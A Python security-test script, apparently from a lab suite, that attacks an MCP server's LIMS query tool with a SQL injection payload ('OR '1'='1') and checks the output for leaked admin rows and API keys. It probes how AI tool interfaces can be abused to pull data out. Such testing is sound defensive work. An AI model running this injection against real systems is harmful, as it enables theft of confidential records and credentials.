from __future__ import annotations

import argparse
import asyncio

from fastmcp import Client

from mcp_attack_common import (
    DEFAULT_URL,
    as_text,
    find_tool,
    list_tools,
    print_summary,
    read_harvest,
    tool_names,
    write_report,
)


async def main() -> None:
    parser = argparse.ArgumentParser(description="A9 schema-aware SQL injection / LIMS extraction test.")
    parser.add_argument("--url", default=DEFAULT_URL)
    parser.add_argument("--output-json", default="results/repro/mcp/a9_schema_aware_sql_injection.json")
    args = parser.parse_args()

    # Lab-safe extraction query: current query_lims matches table names.
    # In a stricter implementation, this would test whether raw SQL is validated as SELECT-only.
    injected_query = "SELECT * FROM staff WHERE role='admin' OR '1'='1'; -- SECURITY_TEST_A9_SQLI"

    async with Client(args.url) as client:
        tools = await list_tools(client)
        names = tool_names(tools)

        report = {
            "attack_id": "a9_schema_aware_sql_injection",
            "target": "LIMS / run_lims_query or query_lims",
            "goal": "confidentiality",
            "url": args.url,
            "available_tools": names,
            "success": False,
            "partial_success": False,
            "success_reason": "",
        }

        tool_to_call = "run_lims_query" if find_tool(tools, "run_lims_query") else "query_lims" if find_tool(tools, "query_lims") else None
        if tool_to_call is None:
            report["success_reason"] = "No LIMS query tool is exposed."
        else:
            arg_name = "sql" if tool_to_call == "run_lims_query" else "query"
            result = await client.call_tool(tool_to_call, {arg_name: injected_query})
            output = as_text(result)
            harvest = read_harvest()
            success = any(token in output.lower() for token in ["api_key", "admin", "sk-pharma"]) or any(
                token in harvest.lower() for token in ["api_key", "admin", "sk-pharma"]
            )
            report.update(
                {
                    "tool_called": tool_to_call,
                    "query": injected_query,
                    "tool_output": output,
                    "harvest_log_tail": harvest[-2000:],
                    "success": success,
                    "partial_success": tool_to_call == "query_lims",
                    "success_reason": (
                        "LIMS query returned or exfiltrated admin/staff-like rows."
                        if success
                        else "LIMS query did not expose admin/staff data under this configuration."
                    ),
                }
            )

        write_report(args.output_json, report)
        print_summary(report)


if __name__ == "__main__":
    asyncio.run(main())
